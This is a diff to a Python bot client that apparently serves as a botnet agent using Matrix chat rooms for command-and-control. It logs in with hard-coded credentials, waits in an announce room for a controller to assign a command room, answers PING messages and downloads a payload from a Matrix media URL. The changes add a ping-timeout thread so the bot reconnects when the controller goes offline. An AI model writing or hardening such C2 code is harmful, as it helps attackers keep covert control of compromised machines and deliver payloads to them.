@@ -1,6 +1,7 @@
 import json
 import platform
 import socket
+import threading
 import time
 import uuid
 from matrix_client.client import MatrixClient, Room
@@ -24,11 +25,14 @@ MATRIX_DOWNLOAD_PREFIX = "https://matrix-client.matrix.org/_matrix/client/v1/med
 
 class Bot:
     access_token: str
-    announce_room: Room
-    command_room: Room
+    announce_room: Room = None
+    command_room: Room = None
     
     announce_listener: uuid.UUID
     command_listener: uuid.UUID
+    
+    last_ping: float = 0
+    ping_timeout_treshold: float = 10
     
     def __init__(self):
         self.got_room = False
@@ -39,7 +43,7 @@ class Bot:
         # login and sync
         try:
             self.access_token = self.client.login(username=USER_NAME, password=PASSWORD)
-            print("[+] Logged in as controller.")
+            print("[+] Logged in as bot.")
         except MatrixRequestError as e:
             print(e)
             if e.code == 403:
@@ -126,8 +130,9 @@ class Bot:
         if botid == self.bot_id:
             self.got_room = True
             self.command_room = self.join_room(roomid)
-            self.client.remove_listener(self.announce_listener)
+            self.announce_room.remove_listener(self.announce_listener)
             self.command_listener = self.command_room.add_listener(self.on_command, event_type="m.room.message")
+            self.last_ping = time.time()
                 
     def on_command(self, room, event):
         msgbody: str = event["content"]["body"]
@@ -136,21 +141,39 @@ class Bot:
             self.announce_room.send_text(
                 f"PONG:{self.command_room.room_id}:{self.bot_id}"
             )
+            self.last_ping = time.time()
         else:
             print(msgbody)
-
+            
+    def make_announcement_listener(self) -> uuid.UUID:
+        return self.announce_room.add_listener(self.on_announcement, event_type="m.room.message")
+            
+    def check_pings(self):
+        while True:
+            time.sleep(self.ping_timeout_treshold)
+            # didn't receive two pings -> controller went offline -> start searching again
+            if time.time() - self.last_ping > self.ping_timeout_treshold * 2:
+                print("controller offline, starting search again")
+                self.got_room = False
+                self.command_room.remove_listener(self.command_listener)
+                self.announce_listener = self.make_announcement_listener()
+            
     def run(self):
         self.login()
         self.announce_room = self.join_room(ANNOUNCE_ROOM_ID)
-        
-        self.announce_listener = self.announce_room.add_listener(self.on_announcement, event_type="m.room.message")
+        # make sure joining and syncing is done before proceding
+        time.sleep(2)
+                
+        self.announce_listener = self.make_announcement_listener()
         self.client.start_listener_thread()
         
         self.download_payload()
+        
         def exit_handler():
             self.disconnect()
-
         atexit.register(exit_handler)
+        
+        threading.Thread(name="PING THREAD", target=self.check_pings, daemon=True).start()
         
         while True:
             if not self.got_room:
